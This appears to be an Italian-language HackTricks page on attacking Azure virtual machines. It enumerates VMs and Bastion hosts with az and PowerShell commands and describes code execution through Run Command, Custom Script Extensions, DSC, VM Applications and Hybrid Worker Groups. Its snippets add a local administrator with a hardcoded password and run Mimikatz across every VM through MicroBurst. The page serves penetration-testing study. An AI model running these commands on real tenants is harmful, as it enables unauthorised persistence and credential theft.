# Az - Macchine Virtuali e Rete

{% hint style="success" %}
Impara e pratica il Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Impara e pratica il Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

## Informazioni di base

[Dal documento:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Le macchine virtuali Azure sono uno dei diversi tipi di [risorse di calcolo scalabili on-demand](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) che Azure offre. Tipicamente, scegli una macchina virtuale quando hai bisogno di maggiore controllo sull'ambiente di calcolo rispetto ad altre opzioni. Questo articolo ti fornisce informazioni su cosa dovresti considerare prima di creare una macchina virtuale, come crearla e come gestirla.

## Informazioni sulla rete Azure

Le reti Azure contengono **diverse entit√† e modi per configurarla.** Puoi trovare una breve **descrizione,** **esempi** e **comandi di enumerazione** delle diverse entit√† di rete Azure in:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** offre una soluzione sicura e completamente gestita per l'accesso RDP (Remote Desktop Protocol) e SSH (Secure Shell) tramite SSL attraverso il portale Azure. √à integrato all'interno di una Rete Virtuale Azure, consentendo la connettivit√† RDP e SSH alle VM utilizzando IP privati, evitando la necessit√† di IP pubblici. Questo lo rende un'alternativa pi√π sicura e conveniente ai metodi tradizionali che coinvolgono assegnazioni di IP pubblici e configurazioni di regole NSG per l'accesso alle VM. Sviluppatori e personale IT possono accedere in modo sicuro alle VM dal portale Azure utilizzando i loro browser web, semplificando il processo per ambienti di sviluppo e test.

Per elencare tutti gli Azure Bastion Hosts nel tuo abbonamento, puoi utilizzare il seguente comando:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumerazione delle VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Esegui comandi in una VM**

### **Accesso AAD in VM**

√à possibile consentire l'accesso agli utenti autenticati tramite AzureAD. Ad esempio, provando ad accedere a una **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (√® importante **utilizzare l'email** con l'azurecorp usata quando si tenta di accedere) potresti ricevere un errore come: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Basta **seguire queste istruzioni** andando su [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) e indicando il codice, utilizzare l'email e la password come credenziali e sarai in grado di connetterti tramite SSH (se quell'utente ha abbastanza permessi per farlo: ruolo `Virtual Machine Administrator Login` o `Virtual Machine User Login`).

### **Esegui Comando**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Esegui Estensione Script Personalizzato**

Le estensioni delle macchine virtuali (VM) di Azure sono **piccole applicazioni** che forniscono configurazione post-deployment e **compiti** di automazione su **VM di Azure**. Ad esempio, se una macchina virtuale richiede l'installazione di software, protezione antivirus o la possibilit√† di eseguire uno script al suo interno, puoi utilizzare un'estensione VM.

Pertanto, se hai accesso per scriverlo, puoi eseguire codice arbitrario:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) √® uno strumento PowerShell simile ad Ansible, utilizzato per configurare un host tramite codice. DSC si integra con Azure, consentendo il caricamento di file di configurazione specifici. Questi file devono aderire a una sintassi rigorosa. In particolare, l'estensione DSC in Azure pu√≤ eseguire comandi da file che soddisfano determinati criteri di formattazione, anche se la sintassi non √® corretta secondo gli standard DSC, come mostrato nella figura fornita.

L'esecuzione di questi comandi √® facilitata dalla funzione [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) in Az PowerShell. I requisiti includono un file **.PS1** con una funzione definita e il file deve essere compresso in un file **.zip**. Anche se la sintassi potrebbe non essere accurata per DSC, il codice verr√† comunque eseguito. Tuttavia, l'estensione segner√† lo stato di esecuzione come "errore" e nessun output del comando sar√† visibile a causa dello stato sovrascritto dal messaggio di errore.

### VM Application Definitions

Le Definizioni di Applicazione VM consentono il deployment ripetibile di applicazioni versionate su una VM Azure. Questa risorsa supporta il deployment e l'aggiornamento delle applicazioni su pi√π VM. Per configurarlo, sono necessari diversi passaggi, che coinvolgono comandi come **`New-AzGalleryApplication`** e **`New-AzGalleryApplicationVersion`** in Az PowerShell.

L'esecuzione di applicazioni o comandi tramite questo metodo coinvolge il **"VMAppExtension"**, che viene installato automaticamente quando un'applicazione viene applicata a una VM. L'estensione recupera il file dall'URI specificato e lo nomina esattamente come l'applicazione, senza un'estensione. Per eseguire correttamente il file, il campo "ManageActions" nella chiamata API REST deve essere configurato per rinominare il file con l'estensione appropriata. La configurazione di questo metodo, una volta completata, assomiglier√† alla struttura mostrata nella figura fornita.

Tuttavia, questo metodo di esecuzione √® relativamente lento, impiegando circa 3-4 minuti per eseguire un'applicazione o un comando. I file relativi a questo processo sono memorizzati in directory specifiche (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` per la copia dell'applicazione e `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` per lo stato di esecuzione).

Entrambe le tecniche forniscono modi unici per eseguire comandi e distribuire applicazioni negli ambienti Azure, ognuna con il proprio insieme di requisiti, passaggi e considerazioni.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) sono una funzionalit√† in Azure che consente l'esecuzione di Runbook, configurati in un'Automation Account, su una Macchina Virtuale (VM) Azure che fa parte del HWG designato. Questa esecuzione √® facilitata tramite un'estensione installata sulla VM, che distribuisce il codice del Runbook sulla VM. Un aspetto significativo di questo processo √® che le credenziali effettive non sono un fattore nell'esecuzione poich√© il codice viene eseguito con privilegi elevati, specificamente come **SYSTEM** o root, come illustrato nella figura fornita.

Un dettaglio cruciale per coloro che utilizzano VM Windows 10 √® la necessit√† di specificare la versione di PowerShell per il Runbook. Dovrebbe essere impostato per essere eseguito come PowerShell Version 5.1 invece di 7.1. Questo requisito deriva dal fatto che PowerShell 7.1 non √® installato per impostazione predefinita su queste VM, portando a un errore nell'esecuzione dello script se viene specificata la versione 7.1.

Questa funzionalit√† di Azure offre un metodo robusto per automatizzare e gestire compiti in ambienti ibridi, consentendo una gestione centralizzata e l'esecuzione di compiti su VM Azure.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
